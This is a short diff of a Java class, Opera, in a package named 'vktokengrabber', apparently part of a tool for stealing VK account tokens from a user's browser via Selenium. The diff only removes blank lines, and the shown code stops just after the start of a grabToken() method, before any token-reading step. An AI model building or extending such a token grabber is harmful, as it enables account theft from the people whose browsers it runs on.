@@ -1,18 +1,15 @@
 package com.github.dedinc.vktokengrabber.browsers;
 
 import java.io.File;
-
 import org.openqa.selenium.Dimension;
 import org.openqa.selenium.JavascriptExecutor;
 import org.openqa.selenium.Point;
 import org.openqa.selenium.chrome.ChromeDriver;
 import org.openqa.selenium.chrome.ChromeOptions;
 import org.openqa.selenium.remote.DesiredCapabilities;
-
 import com.github.dedinc.vktokengrabber.utils.WebDriver;
 
 public class Opera {	
-
 	public static String grabToken() {
 		String username = System.getenv("USERNAME");
 		if (!new File("C:\\Users\\" + username + "\\operadriver_win32\\operadriver.exe").exists()) {
